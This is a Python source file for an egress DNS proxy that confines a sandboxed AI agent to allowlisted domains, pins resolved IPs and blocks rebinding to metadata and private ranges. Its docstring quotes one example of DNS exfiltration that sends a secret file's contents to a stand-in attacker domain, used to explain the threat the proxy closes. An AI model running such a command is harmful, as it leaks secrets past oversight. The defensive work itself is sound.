#!/usr/bin/env python3
"""SquadX egress DNS proxy — layer 2 of RFC-0006 §3.

Why this exists
---------------
The first cut of the egress policy resolved each allowlisted domain **once**, with
`dig`, at setup time, and pinned the resulting IPs with iptables. Two things were
wrong with that:

1. It left UDP 53 wide open, so the allowlist was decorative: an agent could
   exfiltrate through DNS itself (`dig $(cat secret).attacker.example`) without
   ever opening a TCP connection.
2. A one-shot resolution goes stale. Anything behind a CDN or a load balancer
   rotates addresses, so allowlisted hosts break at runtime for no visible reason.

This proxy closes both. It is the *only* resolver the agent can reach (the setup
script redirects :53 to it and drops everything else), so a name that is not on
the allowlist is never resolved at all — there is no answer to smuggle data in.
For a name that *is* allowed, the addresses actually returned are added to an
ipset that iptables accepts against, so the pinned set always matches what the
agent was just told to connect to. Rotation stops mattering.

Trust model
-----------
This process runs in the sidecar, which the agent cannot execute code in — but
they share a network namespace, so the agent *can* send packets here. Treat every
query as hostile input: it is parsed, and nothing else. Names are matched against
the policy, never interpolated into a shell or a filesystem path.

The proxy is fail-closed: if it cannot reach upstream, it SERVFAILs rather than
falling back to letting the agent resolve for itself, and if it dies the setup
script's default-DROP policy means the agent simply has no network.
"""

from __future__ import annotations

import argparse
import fnmatch
import ipaddress
import json
import logging
import os
import socket
import socketserver
import subprocess
import sys
import threading

try:
    from dnslib import QTYPE, RCODE, DNSRecord
except ImportError:  # pragma: no cover - image build guarantees this
    sys.stderr.write("egress-dns-proxy: dnslib missing; rebuild the image\n")
    raise

logger = logging.getLogger("egress-dns-proxy")

# Address families we pin. Anything else (MX, TXT, ...) is answered but pins
# nothing, since there is no address in it to allow.
_PINNED_QTYPES = ("A", "AAAA")

# Link-local, metadata, and other ranges an allowlisted name must never resolve to.
# A domain on the allowlist whose answer points at 169.254.169.254 is a DNS-rebinding
# attempt on the credentials endpoint, not a legitimate CDN, so the address is dropped
# from the pin set even though the *name* was allowed. Mirrors the ranges agentOS
# classifies as restricted (crates/kernel/src/network_policy.rs).
_RESTRICTED_NETS = [
    ipaddress.ip_network(cidr)
    for cidr in (
        "0.0.0.0/8",
        "10.0.0.0/8",
        "127.0.0.0/8",
        "169.254.0.0/16",  # link-local — AWS/GCP/Azure IMDS lives here
        "172.16.0.0/12",
        "192.168.0.0/16",
        "100.64.0.0/10",  # CGNAT
        "224.0.0.0/4",  # multicast
        "240.0.0.0/4",  # reserved
        "::1/128",
        "fc00::/7",  # unique-local
        "fe80::/10",  # link-local
    )
]


def is_restricted_addr(addr: str) -> bool:
    """True if this address must never be pinned, whatever name resolved to it.

    IPv4-mapped and IPv4-compatible IPv6 are unwrapped first: `::ffff:169.254.169.254`
    reaches the same metadata endpoint as its bare IPv4 form, and a check that only
    looks at the v6 form would wave it straight through.
    """
    try:
        ip = ipaddress.ip_address(addr)
    except ValueError:
        return True  # unparseable: refuse to pin it
    if isinstance(ip, ipaddress.IPv6Address):
        mapped = ip.ipv4_mapped
        if mapped is not None:
            ip = mapped
        elif ip.sixtofour is not None:
            ip = ip.sixtofour
    return any(ip in net for net in _RESTRICTED_NETS)


class Policy:
    """Domain allow/deny decisions. Deny wins, and the default is deny."""

    def __init__(self, config: dict):
        self.default_allow = str(config.get("defaultAction", "deny")).lower() == "allow"
        self.allow = [d.lower().rstrip(".") for d in config.get("allowDomains", [])]
        self.deny = [d.lower().rstrip(".") for d in config.get("denyDomains", [])]

    @staticmethod
    def _matches(name: str, pattern: str) -> bool:
        """Match a query name against an allowlist entry.

        `*.pypi.org` matches `files.pypi.org` and also bare `pypi.org` — an allowlist
        entry naming a domain is taken to mean that domain and everything under it,
        which is what the policy author means and what the iptables path already did
        by stripping the `*.` before resolving.
        """
        if fnmatch.fnmatch(name, pattern):
            return True
        if pattern.startswith("*."):
            return name == pattern[2:]
        # An exact entry also covers subdomains, matching operator expectation.
        return name.endswith("." + pattern)

    def allows(self, name: str) -> bool:
        name = name.lower().rstrip(".")
        if any(self._matches(name, p) for p in self.deny):
            return False
        if any(self._matches(name, p) for p in self.allow):
            return True
        return self.default_allow


class IpSetPinner:
    """Adds resolved addresses to the ipset that iptables accepts against.

    Entries carry the set's timeout, so the pin set tracks DNS rather than growing
    forever: an address stops being reachable once nothing has resolved to it for
    a while, which is the behaviour a TTL implies.
    """

    def __init__(self, set_v4: str, set_v6: str, timeout: int):
        self._set_v4 = set_v4
        self._set_v6 = set_v6
        self._timeout = timeout
        self._lock = threading.Lock()

    def pin(self, addr: str) -> bool:
        try:
            ip = ipaddress.ip_address(addr)
        except ValueError:
            return False
        target = self._set_v6 if ip.version == 6 else self._set_v4
        with self._lock:
            proc = subprocess.run(  # noqa: S603 - fixed argv, addr is a parsed IP
                ["ipset", "add", target, str(ip), "timeout", str(self._timeout), "-exist"],
                capture_output=True,
                text=True,
                timeout=5,
            )
        if proc.returncode != 0:
            logger.error(
                "pin_failed addr=%s set=%s err=%s", ip, target, proc.stderr.strip()[:200]
            )
            return False
        return True


class Resolver:
    """Resolves allowed names upstream and pins the answers."""

    def __init__(self, policy: Policy, pinner: IpSetPinner, upstreams: list[tuple[str, int]]):
        self._policy = policy
        self._pinner = pinner
        self._upstreams = upstreams

    def _forward(self, raw: bytes) -> bytes | None:
        """Ask each upstream in turn. Returns None if all fail (caller SERVFAILs)."""
        for host, port in self._upstreams:
            try:
                family = socket.AF_INET6 if ":" in host else socket.AF_INET
                with socket.socket(family, socket.SOCK_DGRAM) as sock:
                    sock.settimeout(4)
                    sock.sendto(raw, (host, port))
                    return sock.recv(4096)
            except (TimeoutError, OSError) as e:
                logger.warning("upstream_failed host=%s err=%s", host, e)
        return None

    def handle(self, raw: bytes) -> bytes:
        try:
            request = DNSRecord.parse(raw)
        except Exception:  # noqa: BLE001 - hostile input; never trust the parser
            logger.warning("malformed_query dropped")
            return b""

        qname = str(request.q.qname)
        qtype = QTYPE.get(request.q.qtype, "?")

        if not self._policy.allows(qname):
            # NXDOMAIN, not REFUSED: refusing tells the agent the name exists but is
            # filtered, and some resolvers retry elsewhere on REFUSED. There is nowhere
            # else to go here, but "does not exist" is the cleaner lie and it carries
            # no data back.
            logger.info("denied name=%s type=%s", qname.rstrip("."), qtype)
            reply = request.reply()
            reply.header.rcode = RCODE.NXDOMAIN
            return reply.pack()

        answer = self._forward(raw)
        if answer is None:
            reply = request.reply()
            reply.header.rcode = RCODE.SERVFAIL
            return reply.pack()

        if qtype in _PINNED_QTYPES:
            self._pin_answer(answer, qname)
        return answer

    def _pin_answer(self, answer: bytes, qname: str) -> None:
        try:
            parsed = DNSRecord.parse(answer)
        except Exception:  # noqa: BLE001 - upstream is not fully trusted either
            logger.warning("malformed_answer name=%s not_pinned", qname)
            return
        for rr in parsed.rr:
            if QTYPE.get(rr.rtype, "") not in _PINNED_QTYPES:
                continue
            addr = str(rr.rdata)
            if is_restricted_addr(addr):
                # The name was allowed but points somewhere it must never reach.
                logger.error(
                    "rebinding_blocked name=%s addr=%s — allowlisted name resolved into "
                    "a restricted range; address not pinned",
                    qname.rstrip("."),
                    addr,
                )
                continue
            if self._pinner.pin(addr):
                logger.info("pinned name=%s addr=%s", qname.rstrip("."), addr)


class _UDPHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        data, sock = self.request
        reply = self.server.resolver.handle(data)  # type: ignore[attr-defined]
        if reply:
            sock.sendto(reply, self.client_address)


class _TCPHandler(socketserver.BaseRequestHandler):
    """DNS over TCP: two-byte length prefix, then the message."""

    def handle(self) -> None:
        try:
            header = self._recv_exactly(2)
            if not header:
                return
            length = int.from_bytes(header, "big")
            payload = self._recv_exactly(length)
            if not payload:
                return
            reply = self.server.resolver.handle(payload)  # type: ignore[attr-defined]
            if reply:
                self.request.sendall(len(reply).to_bytes(2, "big") + reply)
        except OSError:
            return

    def _recv_exactly(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.request.recv(n - len(buf))
            if not chunk:
                return b""
            buf += chunk
        return buf


class _UDPServer(socketserver.ThreadingUDPServer):
    allow_reuse_address = True


class _TCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


def _parse_upstreams(raw: str) -> list[tuple[str, int]]:
    out: list[tuple[str, int]] = []
    for entry in raw.split(","):
        entry = entry.strip()
        if not entry:
            continue
        host, _, port = entry.rpartition(":")
        out.append((host or entry, int(port or 53)))
    return out


def main() -> int:
    parser = argparse.ArgumentParser(description="SquadX egress DNS proxy (RFC-0006)")
    parser.add_argument("--config", required=True, help="policy JSON path")
    parser.add_argument("--listen", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=15353)
    parser.add_argument("--ipset-v4", default="squadx_allow4")
    parser.add_argument("--ipset-v6", default="squadx_allow6")
    parser.add_argument("--pin-timeout", type=int, default=3600)
    parser.add_argument("--upstream", default=os.environ.get("SQUADX_UPSTREAM_DNS", "8.8.8.8:53,1.1.1.1:53"))
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO, format="egress-dns-proxy: %(levelname)s %(message)s", stream=sys.stderr
    )

    with open(args.config, encoding="utf-8") as fh:
        config = json.load(fh)

    policy = Policy(config)
    pinner = IpSetPinner(args.ipset_v4, args.ipset_v6, args.pin_timeout)
    resolver = Resolver(policy, pinner, _parse_upstreams(args.upstream))

    udp = _UDPServer((args.listen, args.port), _UDPHandler)
    tcp = _TCPServer((args.listen, args.port), _TCPHandler)
    udp.resolver = resolver  # type: ignore[attr-defined]
    tcp.resolver = resolver  # type: ignore[attr-defined]

    logger.info(
        "listening on %s:%s default=%s allow=%d deny=%d",
        args.listen,
        args.port,
        "allow" if policy.default_allow else "deny",
        len(policy.allow),
        len(policy.deny),
    )

    threading.Thread(target=tcp.serve_forever, daemon=True).start()
    try:
        udp.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
